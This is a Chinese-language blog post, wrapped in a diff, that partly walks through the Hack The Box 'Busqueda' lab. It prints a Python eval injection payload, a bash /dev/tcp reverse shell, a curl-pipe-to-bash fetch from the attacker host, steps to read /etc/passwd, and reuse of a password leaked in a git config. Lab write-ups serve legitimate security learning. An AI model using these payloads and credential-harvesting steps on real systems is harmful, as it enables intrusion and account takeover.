@@ -1,0 +1,673 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>hack the box |  小张之栈</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      <canvas class="fireworks"></canvas>
+      <style>
+        .fireworks {
+          position: fixed;
+          left: 0;
+          top: 0;
+          z-index: 99999;
+          pointer-events: none;
+        }
+      </style>
+      
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-hack-the-box"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  hack the box
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2023/05/31/hack-the-box/" class="article-date">
+  <time datetime="2023-05-31T00:11:37.000Z" itemprop="datePublished">2023-05-31</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">2.2k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">11 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h1><h2 id="1-Busqueda"><a href="#1-Busqueda" class="headerlink" title="1.Busqueda"></a>1.Busqueda</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_56308852/article/details/130168742?ops_request_misc=%7B%22request_id%22:%22168587920116782425137143%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168587920116782425137143&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-5-130168742-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=Busqueda&spm=1018.2226.3001.4187">htb busqueda wp要点记录_春猿火的博客-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_58869808/article/details/130050438?ops_request_misc=%7B%22request_id%22:%22168587920116782425137143%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168587920116782425137143&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-130050438-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=Busqueda&spm=1018.2226.3001.4187">(87条消息) HTB Busqueda WriteUP_Som3B0dy的博客-CSDN博客</a></p>
+<p>ping一遍，能ping通</p>
+<p>发现端口：&#96;nmap -A  10.10.11.208 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)</span><br><span class="line">|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.52</span><br><span class="line">|_http-title: Did not follow redirect to http://searcher.htb/</span><br><span class="line">|_http-server-header: Apache/2.4.52 (Ubuntu)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br></pre></td></tr></table></figure>
+
+<p>22端口开放，一般最后考虑，如果爆破不出来就放弃。</p>
+<p>火狐直接访问，访问不了</p>
+<p><code>echo &quot;10.10.11.208 searcher.htb &quot; &gt;&gt; /etc/hosts</code></p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604192607683.png"></p>
+<p>选了个google，查找内容为123</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604192819640.png"></p>
+<p>很明显，post。</p>
+<p>抓包试试，加个单引号不显示内容</p>
+<p>sqlmap一下，没有注入点。</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604194935260.png"></p>
+<p>点击后，发现如下东西：</p>
+<blockquote>
+<p>Custom Engine</p>
+<p>from searchor import Engine<br>Engine.new(“Colgate”, “<a target="_blank" rel="noopener" href="https://www.colgate.com/en-us/search/all?term=">https://www.colgate.com/en-us/search/all?term=</a>“)<br>Engine.Colgate.search(“Hi world!”)<br>‘<a target="_blank" rel="noopener" href="https://www.colgate.com/en-us/search/all?term=Hi%20world">https://www.colgate.com/en-us/search/all?term=Hi%20world</a>!”</p>
+<p>Searchor CLI Quick Start</p>
+<p>$ searchor Google “Hello World!” –copy</p>
+</blockquote>
+<p>这是调用引擎库去获取数据吧。</p>
+<p><code>Engine.Colgate.search(&quot;Hi world!&quot;)</code></p>
+<p>wp上说尝试构造<code>eval(complie(“要执行的代码”),“&lt;String&gt;”,“exec”)</code></p>
+<blockquote>
+<p>compile() 是一个 Python 内置函数，用于编译字符串、文件或 AST（Abstract Syntax Trees）对象成为字节码或 AST 对象。它的语法为：</p>
+<p>compile(source, filename, mode, flags&#x3D;0, dont_inherit&#x3D;False, optimize&#x3D;-1)<br>source: 必选项，表示要编译的源代码，可以是字符串、文件或 AST 对象。<br>filename: 可选项，表示编译代码的文件名，如果不是从文件中编译代码，传入 “<string>” 即可。<br>mode: 可选项，表示编译代码类型，可以取值为 “exec”（编译整个代码），“eval”（编译单个表达式）或 “single”（编译单个语句）。<br>flags: 可选项，传入变量或位掩码，用于控制编译器的行为或特性。<br>dont_inherit: 可选项，表示是否继承 sys.flags 和 sys. __ optimizations __ 模块中相关选项的值。<br>optimize: 可选项，表示优化级别，如果设置为 -1，表示使用默认优化级别。<br>compile() 函数编译完成后，将会返回一个 code 对象，这个对象可以传递给 exec() 函数执行，也可以将其作为模块使用。compile() 函数在 Python 中比较常用，常用于动态编译、语法检查和代码执行等场景中。</p>
+</blockquote>
+<p>在bp上这样构造：</p>
+<blockquote>
+<p>query&#x3D;123’<strong>%2b</strong>eval(compile(“import+os\nos.system(‘ls’)+”,’&lt;String&gt;’,’exec’))<strong>%2b’</strong></p>
+</blockquote>
+<p>+、%20我都试过，不行，为啥非要2b,2f也可以，不懂</p>
+<p>效果是这样的，</p>
+<blockquote>
+<p>searchor Google <strong>‘</strong>123’%2beval(compile(“import+os\nos.system(‘ls’)+”,’&lt;String&gt;’,’exec’))%2b’<strong>’</strong>–copy</p>
+</blockquote>
+<p>相当于执行了参数为:</p>
+<p><strong>‘</strong>123’ </p>
+<p>eval(compile(“import+os\nos.system(‘ls’)+”,’&lt;String&gt;’,’exec’))</p>
+<p>和&#39;‘</p>
+<p>repeat结果里是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=&quot;app.py%0Atemplates&quot;&gt;app.py</span><br><span class="line">templates&lt;/a&gt;. If not, click the link.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>那其实ls可以改为 cat app.py，出现一串代码</p>
+<p>shift+ctrl+u后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, render_template, request, redirect</span><br><span class="line">from searchor import Engine</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&amp;#x27;/&amp;#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&amp;#x27;index.html&amp;#x27;, options=Engine.__members__, error=&amp;#x27;&amp;#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&amp;#x27;/search&amp;#x27;, methods=[&amp;#x27;POST&amp;#x27;])</span><br><span class="line">def search():</span><br><span class="line">    try:</span><br><span class="line">        engine = request.form.get(&amp;#x27;engine&amp;#x27;)</span><br><span class="line">        query = request.form.get(&amp;#x27;query&amp;#x27;)</span><br><span class="line">        auto_redirect = request.form.get(&amp;#x27;auto_redirect&amp;#x27;)</span><br><span class="line">        </span><br><span class="line">        if engine in Engine.__members__.keys():</span><br><span class="line">            arg_list = [&amp;#x27;searchor&amp;#x27;, &amp;#x27;search&amp;#x27;, engine, query]</span><br><span class="line">            r = subprocess.run(arg_list, capture_output=True)</span><br><span class="line">            url = r.stdout.strip().decode()</span><br><span class="line">            if auto_redirect is not None:</span><br><span class="line">                return redirect(url, code=302)</span><br><span class="line">            else:</span><br><span class="line">                return url</span><br><span class="line"></span><br><span class="line">        else:</span><br><span class="line">            return render_template(&amp;#x27;index.html&amp;#x27;, options=Engine.__members__, error=&quot;Invalid engine!&quot;)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        return render_template(&amp;#x27;index.html&amp;#x27;, options=Engine.__members__, error=&quot;Something went wrong!&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &amp;#x27;__main__&amp;#x27;:</span><br><span class="line">    app.run(debug=False)</span><br></pre></td></tr></table></figure>
+
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><h4 id="1-shell文件准备"><a href="#1-shell文件准备" class="headerlink" title="1.shell文件准备"></a>1.shell文件准备</h4><p>写一个shell文件</p>
+<p>内容为：<code>bash -i &gt;&amp; /dev/tcp/10.10.14.89/2333 0&gt;&amp;1</code></p>
+<p>这个地址是与htp进行vpn连接的那个地址吧,tun0。</p>
+<p>具体步骤也就是vim shell后，再chmod 777 shell.</p>
+<h4 id="2-监听服务器建立"><a href="#2-监听服务器建立" class="headerlink" title="2.监听服务器建立"></a>2.监听服务器建立</h4><p><code>python3 -m http.server 80</code> 通常用于在本地开发或测试时快速提供 Web 内容。</p>
+<h4 id="3-nc反弹shell"><a href="#3-nc反弹shell" class="headerlink" title="3.nc反弹shell"></a>3.nc反弹shell</h4><p><code>nc -lvnp 2333</code></p>
+<h4 id="4-发包"><a href="#4-发包" class="headerlink" title="4.发包"></a>4.发包</h4><p>包的数据写为</p>
+<p><code>query=http%3a//127.0.0.1/debug&#39;%2beval(compile(&#39;for+x+in+range(1)%3a\n+import+os\n+os.system(&quot;curl+http%3a//10.10.14.89/shell|bash&quot;)&#39;,&#39;a&#39;,&#39;single&#39;))%2b&#39;</code></p>
+<p>(不明觉厉o(￣▽￣)ｄ )</p>
+<p>。。。然后捏，我没监听到东西。</p>
+<p>好吧，<strong>是因为kali有防火墙</strong></p>
+<p><code>sudo systemctl stop ufw</code></p>
+<p><code>sudo systemctl disable ufw</code></p>
+<p>将防火墙禁用，重新发包即可。</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604214533285.png"></p>
+<p>然后在nc窗口下</p>
+<p>输入命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">connect to [10.10.14.89] from (UNKNOWN) [10.10.11.208] 56914</span><br><span class="line">bash: cannot set terminal process group (1648): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">svc@busqueda:/var/www/app$ pwd </span><br><span class="line">pwd</span><br><span class="line">/var/www/app</span><br><span class="line">svc@busqueda:/var/www/app$ whoami</span><br><span class="line">whoami</span><br><span class="line">svc</span><br><span class="line">svc@busqueda:/var/www/app$ ls</span><br><span class="line">ls</span><br><span class="line">app.py</span><br><span class="line">templates</span><br><span class="line">svc@busqueda:/var/www/app$ cd /home</span><br><span class="line">cd /home</span><br><span class="line">svc@busqueda:/home$ ls</span><br><span class="line">ls</span><br><span class="line">svc</span><br><span class="line">svc@busqueda:/home$ cd svc</span><br><span class="line">cd svc</span><br><span class="line">svc@busqueda:~$ ls </span><br><span class="line">ls</span><br><span class="line">snap</span><br><span class="line">user.txt</span><br><span class="line">svc@busqueda:~$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">40941e3cddd105f881ea90e716a3d6a2</span><br><span class="line"></span><br><span class="line">cat etc/hosts</span><br><span class="line">127.0.0.1 localhost</span><br><span class="line">127.0.1.1 busqueda searcher.htb gitea.searcher.htb</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>(内网信息收集部分，参考大佬的习惯是先看sudo -l，再看是否存在未知域名，然后再看web文件夹)<br>访问下未知域名gitea.searcher.htb，<strong>反正我不知道怎么访问</strong>。</p>
+<p>密码一般在etc&#x2F;passwd和etc&#x2F;shadow中，后者的密码一般是哈希值。</p>
+<p>在passwd中找有bash权限的用户，已知有svc，且确定下一个提权的是root</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">svc@busqueda:/$ cat etc/passwd|grep /bin/bash</span><br><span class="line">cat etc/passwd|grep /bin/bash</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">svc:x:1000:1000:svc:/home/svc:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>重新找到svc文件夹，这次要记得查看<strong>所有</strong>文件，注意隐藏文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">svc@busqueda:~$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 60</span><br><span class="line">drwxr-x--- 6 svc  svc  4096 Jun  4 12:57 .</span><br><span class="line">drwxr-xr-x 3 root root 4096 Dec 22 18:56 ..</span><br><span class="line">lrwxrwxrwx 1 root root    9 Feb 20 12:08 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout</span><br><span class="line">-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc</span><br><span class="line">drwx------ 2 svc  svc  4096 Feb 28 11:37 .cache</span><br><span class="line">-rw-rw-r-- 1 svc  svc    76 Apr  3 08:58 .gitconfig</span><br><span class="line">drwx------ 3 svc  svc  4096 Jun  4 10:26 .gnupg</span><br><span class="line">drwxrwxr-x 5 svc  svc  4096 Jun 15  2022 .local</span><br><span class="line">lrwxrwxrwx 1 root root    9 Apr  3 08:58 .mysql_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile</span><br><span class="line">lrwxrwxrwx 1 root root    9 Feb 20 14:08 .searchor-history.json -&gt; /dev/null</span><br><span class="line">drwx------ 3 svc  svc  4096 Jun  4 04:06 snap</span><br><span class="line">-rw-r----- 1 root svc    33 Jun  4 03:26 user.txt</span><br><span class="line">-rw------- 1 svc  svc  9573 Jun  4 11:29 .viminfo</span><br><span class="line">-rw------- 1 svc  svc    54 Jun  4 07:23 .Xauthority</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>-l长格式信息,-a 所有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">svc@busqueda:~$ cat .gitconfig</span><br><span class="line">cat .gitconfig</span><br><span class="line">[user]</span><br><span class="line">        email = cody@searcher.htb</span><br><span class="line">        name = cody</span><br><span class="line">[core]</span><br><span class="line">        hooksPath = no-hooks</span><br></pre></td></tr></table></figure>
+
+<p>注意到，一开始监听进来时，有&#x2F;var&#x2F;www&#x2F;app，查看下隐藏文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">svc@busqueda:/home$  ..</span><br><span class="line">cd ..</span><br><span class="line">svc@busqueda:/$ cd ..</span><br><span class="line">cd ..</span><br><span class="line">svc@busqueda:/$ cd /var/www/app</span><br><span class="line">cd /var/www/app</span><br><span class="line">svc@busqueda:/var/www/app$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .</span><br><span class="line">drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py</span><br><span class="line">drwxr-xr-x 8 www-data www-data 4096 Jun  4 03:26 .git</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates</span><br><span class="line">svc@busqueda:/var/www/app$ </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">svc@busqueda:/var/www/app$ cd .git</span><br><span class="line">cd .git</span><br><span class="line">svc@busqueda:/var/www/app/.git$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 52</span><br><span class="line">drwxr-xr-x 8 www-data www-data 4096 Jun  4 03:26 .</span><br><span class="line">drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 ..</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 branches</span><br><span class="line">-rw-r--r-- 1 www-data www-data   15 Dec  1  2022 COMMIT_EDITMSG</span><br><span class="line">-rw-r--r-- 1 www-data www-data  294 Dec  1  2022 config</span><br><span class="line">-rw-r--r-- 1 www-data www-data   73 Dec  1  2022 description</span><br><span class="line">-rw-r--r-- 1 www-data www-data   21 Dec  1  2022 HEAD</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 hooks</span><br><span class="line">-rw-r--r-- 1 root     root      259 Apr  3 15:09 index</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 info</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Dec  1  2022 logs</span><br><span class="line">drwxr-xr-x 9 www-data www-data 4096 Dec  1  2022 objects</span><br><span class="line">drwxr-xr-x 5 www-data www-data 4096 Dec  1  2022 refs</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>看下config和logs</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">svc@busqueda:/var/www/app/.git$ cat config</span><br><span class="line">cat config</span><br><span class="line">[core]</span><br><span class="line">        repositoryformatversion = 0</span><br><span class="line">        filemode = true</span><br><span class="line">        bare = false</span><br><span class="line">        logallrefupdates = true</span><br><span class="line">[remote &quot;origin&quot;]</span><br><span class="line">        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git</span><br><span class="line">        fetch = +refs/heads/*:refs/remotes/origin/*</span><br><span class="line">[branch &quot;main&quot;]</span><br><span class="line">        remote = origin</span><br><span class="line">        merge = refs/heads/main</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Apr  3 14:33 .</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Apr  3 14:33 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data  163 Apr  3 14:33 main</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ cd main</span><br><span class="line">cd main</span><br><span class="line">bash: cd: main: Not a directory</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Apr  3 14:33 .</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Apr  3 14:33 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data  163 Apr  3 14:33 main</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ cat main</span><br><span class="line">cat main</span><br><span class="line">0000000000000000000000000000000000000000 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 administrator &lt;administrator@gitea.searcher.htb&gt; 1671970461 +0000  update by push</span><br><span class="line">这里大佬已经试用过了，哈希值破不开，转看config</span><br></pre></td></tr></table></figure>
+
+<p>哎，上述内容在大佬博客里引入了linpeas工具，应该是可以帮助自动查找文件的。</p>
+<p>关注下这串代码：</p>
+<p><code>http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git</code></p>
+<p>尝试下cody后的东西作为密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">svc@busqueda:~$ echo &quot;jh1usoih2bkjaspwe92&quot; | sudo -S -l</span><br><span class="line">echo &quot;jh1usoih2bkjaspwe92&quot; | sudo -S -l</span><br><span class="line">[sudo] password for svc: Matching Defaults entries for svc on busqueda:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User svc may run the following commands on busqueda:</span><br><span class="line">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>jh1usoih2bkjaspwe92确实是密码。</p>
+<p>待续。。。。。。。。。。。。。。。。。。</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/05/31/hack-the-box/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kali/" rel="tag">kali</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2023/05/31/%E5%8F%8D%E5%BC%B9shell/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">反弹shell</div>
+      </a>
+    
+  </nav>
+
+  
+   
+  
+   
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2023
+        <i class="ri-heart-fill heart_icon"></i> 是羽泪云诶
+      </li>
